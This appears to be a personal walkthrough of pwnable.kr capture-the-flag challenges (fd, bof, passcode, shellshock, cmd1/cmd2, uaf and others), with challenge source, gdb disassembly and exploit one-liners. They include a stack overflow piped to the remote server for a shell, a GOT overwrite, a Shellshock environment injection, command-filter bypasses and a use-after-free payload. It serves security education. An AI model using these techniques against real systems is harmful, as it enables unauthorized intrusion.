# PwnableWalkthrough
### FD - Level 1

We have a fd.c, fd executable, and the flag.
in the fd file we can see the following code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```

which takes a number from argv, substracts 0x1234 from it, and reads 32 bytes from the file.

as we know, stdin has a file discriptor of 0, so if we pass 4660 = 0x1234 to the program , it should let us write LETMEWIN and get the flag!


### Collision - Level 2

we have the following code: 
```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
```
First, lets convert the hashcode variable to decimal, so we can easily understand the program. we get: 568134124
As we can see, the check_password function takes an array of chars, converts it into an array of ints, and adds 5 numbers.
Then we check if the result equals to hashcode.
Lets start creating our payload.
First, lets choose the 5 numbers we are  going to add in order to get 568134124.
The easiest number combination is 113626824 + 113626824 + 113626824 + 113626824 + 113626828
lets take each number, and convert it back to hex using little endian:
113626824 = C8CEC506
113626828 = CCCEC506

so we can run the following command to get the flag:
```python
./col $(python -c "print('\xC8\xCE\xC5\x06' * 4 + '\xCC\xCE\xC5\x06' )")
```
### Bof - Level 3
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}

```
lets disassemble the func function in the  executable using gdb:

Dump of assembler code for function func:

```assembly
   0x0000062c <+0>:     push   %ebp
   0x0000062d <+1>:     mov    %esp,%ebp
   0x0000062f <+3>:     sub    $0x48,%esp
   0x00000632 <+6>:     mov    %gs:0x14,%eax
   0x00000638 <+12>:    mov    %eax,-0xc(%ebp)
   0x0000063b <+15>:    xor    %eax,%eax
   0x0000063d <+17>:    movl   $0x78c,(%esp)
   0x00000644 <+24>:    call   0x645 <func+25>
   0x00000649 <+29>:    lea    -0x2c(%ebp),%eax
   0x0000064c <+32>:    mov    %eax,(%esp)
   0x0000064f <+35>:    call   0x650 <func+36>
   0x00000654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)
   0x0000065b <+47>:    jne    0x66b <func+63>
   0x0000065d <+49>:    movl   $0x79b,(%esp)
   0x00000664 <+56>:    call   0x665 <func+57>
   0x00000669 <+61>:    jmp    0x677 <func+75>
   0x0000066b <+63>:    movl   $0x7a3,(%esp)
   0x00000672 <+70>:    call   0x673 <func+71>
   0x00000677 <+75>:    mov    -0xc(%ebp),%eax
   0x0000067a <+78>:    xor    %gs:0x14,%eax
   0x00000681 <+85>:    je     0x688 <func+92>
   0x00000683 <+87>:    call   0x684 <func+88>
   0x00000688 <+92>:    leave  
   0x00000689 <+93>:    ret    
End of assembler dump.
```
We can see some usefull things here.
First of all, in the following line: ` cmpl   $0xcafebabe,0x8(%ebp) ` we can see that some comparison has been made between the hardcoded cafebabe parameter and another variable(which is the key variable), 
which is located in the address 0x8 after ebp. so based of the c file, we know the the key variable sits in ebp + 0x8, so we know to where we should write.
Now, lets try to understand where the gets function is writing to.
Based of the c code, the gets function gets called right before the if when we check the key, so the line: `call   0x650 <func+36>` should be it
As we know, the gets function takes in a paramater which is the address to write into(which is what we are looking for), and we can see that right before the call command
we set -0x2c(%ebp) in eax, which is the operand for the gets command.
so the overflowme variable sits in ebp - 0x2c.
lets calculate the distance: 0x8 + ebp - (ebp - 0x2c) = 0x8 + 0x2c = 52 (decimal)
so in order to overwrite the overflowme variable, we should fill 52 spaces, and then write our payload.
we can do it by running the following command, and then we get a shell:

```python
(python2 -c "print('A' * 52 + '\xbe\xba\xfe\xca\n')"; cat) | nc pwnable.kr 9000 
```

### Flag - Level 4

First of all, we can disassemble the exetuable using gdb, but we will notice that we cant.
The next step is to try running the strings command on the executable , to get some idea of whats going on
When we try to , we get something usefull: 
`$Info: This file is packed with the UPX executable packer http://upx.sf.net $`
which means that we cant disassemble our program because of an exectuable packer called upx.
lets run upx -d flag to unpack it, and then we can successfully disassemble it.
```assembly
   0x0000000000401164 <+0>:     push   %rbp
   0x0000000000401165 <+1>:     mov    %rsp,%rbp
   0x0000000000401168 <+4>:     sub    $0x10,%rsp
   0x000000000040116c <+8>:     mov    $0x496658,%edi
   0x0000000000401171 <+13>:    call   0x402080 <puts>
   0x0000000000401176 <+18>:    mov    $0x64,%edi
   0x000000000040117b <+23>:    call   0x4099d0 <malloc>
   0x0000000000401180 <+28>:    mov    %rax,-0x8(%rbp)
   0x0000000000401184 <+32>:    mov    0x2c0ee5(%rip),%rdx        # 0x6c2070 <flag>
   0x000000000040118b <+39>:    mov    -0x8(%rbp),%rax
   0x000000000040118f <+43>:    mov    %rdx,%rsi
   0x0000000000401192 <+46>:    mov    %rax,%rdi
   0x0000000000401195 <+49>:    call   0x400320
   0x000000000040119a <+54>:    mov    $0x0,%eax
   0x000000000040119f <+59>:    leave  
   0x00000000004011a0 <+60>:    ret    
End of assembler dump.
```
we see a comment of the string, then we run x/s *0x6c2070 to see the string in that address.

### Level 5 - Passcode

first of all, I highly recommend you guys to sit and try to do the challenge yourself, because I think its really good.

This time, we have a simple c program which asks the user for a name, 2 numbers, and checks if the numbers are equal to some numbers.
Lets try to disassemble the `welcome` function:

```assembly
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   ebp
   0x0804860a <+1>:     mov    ebp,esp
   0x0804860c <+3>:     sub    esp,0x88
   0x08048612 <+9>:     mov    eax,gs:0x14
   0x08048618 <+15>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804861b <+18>:    xor    eax,eax
   0x0804861d <+20>:    mov    eax,0x80487cb
   0x08048622 <+25>:    mov    DWORD PTR [esp],eax
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    eax,0x80487dd
   0x0804862f <+38>:    lea    edx,[ebp-0x70]
   0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
   0x08048636 <+45>:    mov    DWORD PTR [esp],eax
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    eax,0x80487e3
   0x08048643 <+58>:    lea    edx,[ebp-0x70]
   0x08048646 <+61>:    mov    DWORD PTR [esp+0x4],edx
   0x0804864a <+65>:    mov    DWORD PTR [esp],eax
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
   0x08048652 <+73>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048655 <+76>:    xor    eax,DWORD PTR gs:0x14
   0x0804865c <+83>:    je     0x8048663 <welcome+90>
   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:    leave  
   0x08048664 <+91>:    ret    
End of assembler dump.
```

this function will ask the user for a string of length 100. the most important thing its to notice that the string is located in `ebp - 0x70`, so lets keep that in mind.
now lets disassemble the `login` function:

```assembly
Dump of assembler code for function login:
   0x08048564 <+0>:     push   ebp
   0x08048565 <+1>:     mov    ebp,esp
   0x08048567 <+3>:     sub    esp,0x28
   0x0804856a <+6>:     mov    eax,0x8048770
   0x0804856f <+11>:    mov    DWORD PTR [esp],eax
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    eax,0x8048783
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    eax,0x8048786
   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    eax,0x8048783
   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave  
   0x080485f0 <+140>:   ret    
   0x080485f1 <+141>:   mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
   0x080485fd <+153>:   mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
End of assembler dump.
```
We can see that `passcode1` is located in `ebp - 0x10`, and `passcode2` in `ebp - 0xc`.
So the memory will look something like that:

![image](https://user-images.githubusercontent.com/56035342/209885145-5571d145-f628-4b3a-a802-a3d4ed536e01.png)

so we can change the value of passcode1 even inside the `welcome` function!
now lets try to understand what the `login` function does.
First of all, the program will ask the user for input, but it will write it to the value of passcode1.
And right after that we have a `fflush` library call.
Lets use gdb to see the address of `fflush`:
```assembly
(gdb) disassemble fflush
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:     jmp    DWORD PTR ds:0x804a004
   0x08048436 <+6>:     push   0x8
   0x0804843b <+11>:    jmp    0x8048410
End of assembler dump.
```
We found the address 0x804a004, which is an address in the Global Offset Table, which calls the libc fflush function.
If we can set the value of `passcode1` to `0x804a004`, we can  change the address in the Global Offset Table, to run our own code!
In order to change the value of `passcode1` , we need to do:
`(python -c "print('A' * 96 + '\x04\xa0\x04\x08')") | ./passcode`

Then, we will reach the scanf of `passcode1`, which will write an input from the user into 0x804a004.
So now we can control where the program will jump to!
In order to get the flag, the best thing to do is to jump to the end , where the `system("/bin/cat flag");` starts.
it starts right in this line:
`0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af`
but because scanf takes input in decimal, we need to change 0x080485e3 to decimal, which is 134514147.
So the final solution will be:
`(python -c "print('A' * 96 + '\x04\xa0\x04\x08' + '134514147')") | ./passcode`


### Level 6 - Random

We have a c file, which generates a random number, xors it with our input, and checks if it equals to 0xdeadbeef.
But in reality, it doesn't really generates a random number, since a seed hasn't been specified, so the numbers will be the same.
We can try to create that number, by extracting key from the equation:  `0xdeadbeef ^ random = (key ^ random) ^ random = key`
After running this print: `printf("%d", rand() ^ 0xdeadbeef);`
we get -1255736440, which will give us the flag when entered in the executable!

### Level 9 - Mistake

We have a c code, which takes input from the user, xors it, and checks if it equals to a specific string located in a file.
This line handles opening the file:
`if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)`

but because of operands priority, < comes before = , fd will be always 0. (of ourse only if the file was opened)
Then we use the read command on fd, which is 0, but because 0 is the file descriptor of stdin, it actually asks us for the password, so now we can control it.
So lets give it the password: bbbbbbbbbb
and then when it actually asks us to guess the password, we should enter cccccccccc , beacuse cccccccccc will become bbbbbbbbbb after the xor function.

### Level 10 - Shellshock

Now we have a c code which runs the command `echo shellshock` with root privileges.

```c
#include <stdio.h>
int main(){
 setresuid(getegid(), getegid(), getegid());
 setresgid(getegid(), getegid(), getegid());
 system("/home/shellshock/bash -c 'echo shock_me'");
 return 0;
}
```
the program doesn't require any input. But beacause of the name of the ctf, we can know it has something to do with the famous shellshock vulnerability.
Then I found a cool way of exploiting it:

`env x='() { :;}; echo vulnerable' ./shellshock`

but it only echos vulnerable into the string.
if we try to do `cat flag`, we'll see that it throws some kind of error.
So I used this trick to see the flag:
env x='() { :;}; echo $(<flag)' ./shellshock


### Level 11 - Coin1

Now we have a cool game:
we are given with number of coins, and number of guesses.
One of those coins is fake and its weight is 9kg while the others are 10kg, and we need to find this fake coin 100 times, in 60 seconds.
We can find it by weighing series of coins, and get the total amount of kgs.
When playing a bit with the program , I noticed that in every game, 2^C > N, so I thought solving it with binary search, so that I can find it in C tries.
First of all I weighed the first half, if the odd one is in them, I know that it can't be in the other half, and I continued in this pattern.
At the end I have found the fake coin, and sent it back to the server.
I thought I was done, but my code was too slow, and it couldn't find the fake coin 100 times.
So because communicating with a local computer in your subnet is really fast, 
I ssh'ed into pwnable.kr using one of the ssh users from the previous challenges (for example fd), and then I ran my code in it.

My code:

```python
import socket

socket = socket.socket()  
socket.connect(("127.0.0.1", 9007))  
welcome_msg = socket.recv(2048)
print(welcome_msg)

for _ in range(0, 100):
        msg = socket.recv(2048).decode()
          
        N, C = [int(i.split("=")[1]) for i in msg.split(" ")]
             
        low = 0
        high = N - 1   
        mid = (low + high) // 2
            
        for i in range(C):
                mid = (low + high) // 2 
                  
                payload = " ".join([str(i) for i in range(low,  mid+1 )])
                     
                socket.sendall((payload + "\n").encode())
                msg = socket.recv(1024).decode().replace("\n" , "")
                    
                if msg.isnumeric() and int(msg) % 10 == 0: #if its  divisible by 10 it means that the fake coin is in the other half
                        low  = mid  + 1
                else:   
                        high = mid - 1 
           
        socket.sendall((str(low) + "\n").encode())
        print(socket.recv(2048).decode())   

print(socket.recv(2048).decode())
print(socket.recv(2048).decode())
```


### Level 12 - BlackJack

In this challenge we have to be millionares.
We have the source code given to us, so after searching for something interseting, I have found this:
```c
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);

 if (bet > cash) //If player tries to bet more money than player has
 {
		printf("\nYou cannot bet more money than you have.");
		printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
} // End Function
```
it asks the user for a number, and checks if it bigger than the money they have.
We can exploit it by entering a really small number, like -100000000 which the if will not stop.
Then once we lost, this following line gets called:

`cash = cash - bet;`
but because bet is negetive, we get 100000000!
And then when playing again we can see the flag!

### Level 13 - lotto

This time, we have a program which takes input,  generates 6 numbers, and checks if they are the same.
In this circumstances, we have a chance of 1/8145060 to win.
But lets try to understand the code in order to exploit it:
```c

unsigned char submit[6];

void play(){

        int i;
        printf("Submit your 6 lotto bytes : ");
        fflush(stdout);

        int r;
        r = read(0, submit, 6);

        printf("Lotto Start!\n");
        //sleep(1);

        // generate lotto numbers
        int fd = open("/dev/urandom", O_RDONLY);
        if(fd==-1){
                printf("error. tell admin\n");
                exit(-1);
        }
        unsigned char lotto[6];
        if(read(fd, lotto, 6) != 6){
                printf("error2. tell admin\n");
                exit(-1);
        }
        for(i=0; i<6; i++){
                lotto[i] = (lotto[i] % 45) + 1;         // 1 ~ 45
        }
        close(fd);

        // calculate lotto score
        int match = 0, j = 0;
        for(i=0; i<6; i++){
                for(j=0; j<6; j++){
                        if(lotto[i] == submit[j]){
                                match++;
                        }
                }
        }

        // win!
        if(match == 6){
                system("/bin/cat flag");
        }
        else{
                printf("bad luck...\n");
        }

}

```
First of all , I noticed that when we enter our input, its not really asking us for 6 numbers, but 6 chars, so input like "abcdef" is valid.
so as the random numbers, but then it does modulo 45.

Then, in the for loops that check if there are 6 hits, it iterates through each character in `lotto`, and then compares it to each character in `sumbit`
which means, if our input is something like `111111`, and the generated numbers are: `1,2,3,4,5,6`, we would have 6 hits.
But because the input is taken as chars, and the random numbers are between 1-45, we would have to enter 6 chars which their ascii value is less than 45.
So if we enter something like `!!!!!!!` (the ascii value of `!` is 33), we can have a better chance of winning the game (we need only one of the 6 generated random numbers to be 33, so the chance of us winning is 6/45) so after giving the program `!!!!!!` many times, we will get the flag!


### Level 14 - cmd1

We have a c code which changes the path enviorment variable to /thankyouverymuch, filters our input, and run it.
We would normally just do `./cmd1 "cat flag"`, but first of all we cant just run cat, cause we changed the enviroment variable, so we need to specify the whole path which is /bin/cat. the other problem is that the program filters any inputs which contains the word `flag`.
We can still see the flag if we just do:
`./cmd1 "cat *" `
to see all the files in the directory, and at the bottom we can see the flag.

### Level 15 - cmd2

This challenge is really close to cmd1. it takes input from argv, filters it, and executes it using system().

Code: 
```c
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```
First of all , it changes the path enviroment variable, so we can't just do `cat *`, and we need to specify the whole path of cat
which is `/bin/cat`. but the filter now is a lot stricter, and it doesn't allow any `/`. so we need to think about a way to run cat,
without specifing the whole path, and without being in the default path enviroment variable.
The way to come across it, is by using the `command` bash builtin command.
This command executes the given command normally *but* if the `-p` flag is given, 
the  search  for  command  is  performed  using  a  default  value for PATH that is
guaranteed to find all of the standard utilities, so we can run `cat` normally.
Our solution will be:
`./cmd2 "command -p cat *"`

### Level 16 - uaf

We have a cpp code, which allocates 2 classes, Male and Female.
Each one of them has an `introduce` function, and a `give_shell` function which they inherit from Human.
We can choose between 3 different actions to do:
1. call introduce in each one of the  classes
2. allocate a string to the memory
3. free the classes

first of all, lets see how the classes look in the heap:
```
0x614ea0        0x0000000000000000      0x0000000000000031      ........1.......
0x614eb0        0x0000000000000004      0x0000000000000004      ................
0x614ec0        0x0000000000000000      0x000000006b63614a      ........Jack....
0x614ed0        0x0000000000000000      0x0000000000000021      ........!.......
0x614ee0        0x0000000000401570      0x0000000000000019      p.@.............

0x614ef0        0x0000000000614ec8      0x0000000000000031      .Na.....1.......
0x614f00        0x0000000000000004      0x0000000000000004      ................
0x614f10        0x0000000000000000      0x000000006c6c694a      ........Jill....
0x614f20        0x0000000000000000      0x0000000000000021      ........!.......
0x614f30        0x0000000000401550      0x0000000000000015      P.@.............
```
if we set a breakpoint right before the first introduce, we can see the value of rax, to see the address of the vtable.
After doing it, we get `0x0000000000401570`
Then we can see in the dissassemble, that it will add 8 bytes to the vtable, and then it will call that function:

![image](https://user-images.githubusercontent.com/56035342/211359440-91d9a83f-1457-43de-b440-7a8feb4dbc11.png)
If we disassemble the first address in this image, we can see that its the `give_shell` function.
So, in order to run that function, we would have to change the stored vtable address to 0x0000000000401570 - 8 bytes (because then it will add 8 bytes, and it will call the `give_shell` function)
We can do that by using deleteing the classes by using option 3 in the menu, and then using option 2, which allocates a string to the heap.
the size of the chunk is 32 bytes, so our allocated string should be 32 bytes in total.
But because each malloc allocates extra 8 bytes, we should write 24 bytes.
Which means our payload will be:
`python -c "print('\x68\x15\x40\x00\x00\x00\x00\x00')" > payload`
`./uaf 24 payload`









